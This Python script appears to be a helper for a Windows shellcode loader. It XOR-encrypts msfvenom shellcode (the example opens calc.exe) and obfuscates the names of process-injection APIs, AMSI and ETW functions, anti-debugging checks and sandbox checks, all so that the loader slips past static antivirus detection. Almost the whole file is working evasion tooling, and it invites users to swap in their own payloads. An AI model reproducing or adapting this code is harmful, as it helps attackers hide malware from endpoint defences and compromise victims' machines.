# one-byte xor obfuscation key
xorKey = 0xb6

# 23-chars (24-bytes decoded) key for shellcode obfuscation - comment out either first two lines or next two lines
txtShellcodeXorKey = "Ho7sAM3Eh0BA5lPQw2zXw3N"
encodedShellcodeKey = ""

#txtShellcodeXorKey = ""
#encodedShellcodeKey = b"\x53\x46\xb0\x0e\x0c\x09\x4e\x5b\xa1\xd7\xef\xcd\x59\x66\x93\x63\x1d\x9b\xa6\x60\x24\x7c\x44"

# actual raw shellcode; create your own with Metasploit msfvenom.
# This example just opens calc.exe (for Windows x64)
# msfvenom -p windows/x64/exec CMD=calc.exe -f py
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# ------------------------------------------------------------------------------------------------

def varDef(var_name,out_data,dec_data):
	out_str=byteArrayToPythonStyle(out_data)
	ret="char "+var_name+"[] = "+out_str+";"
	if(len(dec_data)>0):
		ret+=" // "+dec_data
	return ret

def xorBytes(bytesString,oneByte):
	ret=bytearray(b"")
	for i in bytesString:
		ret.append(i ^ oneByte)
	return ret

def enc(var_name,str_to_obfuscate):
	out_bytes=xorBytes(str.encode(str_to_obfuscate),xorKey) # xorKey is the global variable
	return varDef(var_name,out_bytes,str_to_obfuscate)

def encodeShellcode(rawShellcode,realKey):
	keylen=len(realKey)
	decryptedShellcode=bytearray(b"")
	keyPos=0
	for i in rawShellcode:
		decryptedShellcode.append(i ^ realKey[keyPos])
		keyPos=(keyPos+1) % keylen
	return decryptedShellcode[::-1] # reverse

def byteArrayToCStyle(bytes):
	ret=""
	for i in bytes:
		if(len(ret)>0):
			ret+=", "
		ret+="0x"+format(i,"02x")
	return "{ "+ret+" }"

def byteArrayToPythonStyle(bytes):
	ret=""
	for i in bytes:
		ret+="\\x"+format(i,"02x")
	return "\""+ret+"\""

if(len(encodedShellcodeKey)==0):
	encodedShellcodeKey=xorBytes(str.encode(txtShellcodeXorKey),xorKey)

print("line 123:")
print("#define KEY 0x{:02x}".format(xorKey))
print()

print("line 125:")
if(len(txtShellcodeXorKey)==0):
	print(varDef("decKey",encodedShellcodeKey,""))
else:
	print(enc("decKey",txtShellcodeXorKey))
print()

print("line 128:")
print("unsigned char shellcode[] = "+byteArrayToCStyle(encodeShellcode(buf,xorBytes(encodedShellcodeKey,xorKey)))+";")
print()

print("lines 234...250:")
print("/* Encrypted strings by xor to evade static stuff: */")
print(enc("cNtAllocateVirtualMemory","NtAllocateVirtualMemory"))
print(enc("cNtWriteVirtualMemory","NtWriteVirtualMemory"))
print(enc("cNtCreateThreadEx","NtCreateThreadEx"))
print(enc("cNtProtectVirtualMemory","NtProtectVirtualMemory"))
print(enc("cNtQueryInformationThread","NtQueryInformationThread"))
print(enc("cCreateFileA","CreateFileA"))
print(enc("cGetCurrentProcess","GetCurrentProcess"))
print(enc("cNtdll","ntdll.dll"))
print(enc("cAmsi","amsi.dll"))
print(enc("cEtwEventWrite","EtwEventWrite"))
print(enc("cMapViewOfFile","MapViewOfFile"))
print(enc("cCheckRemote","CheckRemoteDebuggerPresent"))
print(enc("cCheckGlobalMemory","GlobalMemoryStatusEx"))
print(enc("cLib2Name","kernel32.dll"))
print(enc("b","VirtualProtect"))
print(enc("cCreateFileMapping","CreateFileMappingA"))
print()

print("line 262:")
print(enc("cVirtualAllocExNuma","VirtualAllocExNuma"))
